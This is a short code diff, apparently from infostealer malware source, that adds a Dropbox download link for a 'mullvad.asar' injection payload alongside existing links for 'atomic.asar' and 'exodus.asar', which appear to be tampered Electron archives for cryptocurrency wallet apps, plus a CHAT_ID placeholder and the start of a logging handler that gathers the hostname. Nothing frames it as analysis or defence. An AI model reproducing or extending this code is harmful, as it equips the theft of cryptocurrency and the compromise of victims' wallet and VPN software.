@@ -30,6 +30,7 @@ CHAT_ID = "%CHAT_ID%"
 
 atomic_injection_url = "https://www.dropbox.com/scl/fi/vcgr1flh520p4wc2vahyz/atomic.asar?rlkey=xdrqmiga31nix63bs124gu6ld&st=f9t1keq5&dl=1"
 exodus_injection_url = "https://www.dropbox.com/scl/fi/4sab386qgb99niee4uexg/exodus.asar?rlkey=shj7wwg5ekz5jzcd7vcndd17c&st=rkxs7sgi&dl=1"
+mullvad_injection_url = "https://www.dropbox.com/scl/fi/vqp9enm28lnrx9ds9ckao/mullvad.asar?rlkey=gimdi0ctlx5hb4a6a5uuxvr4f&st=7k6ws8js&dl=1"
 
 def logs_handler(error_message: str) -> None:
     hostname = platform.node()
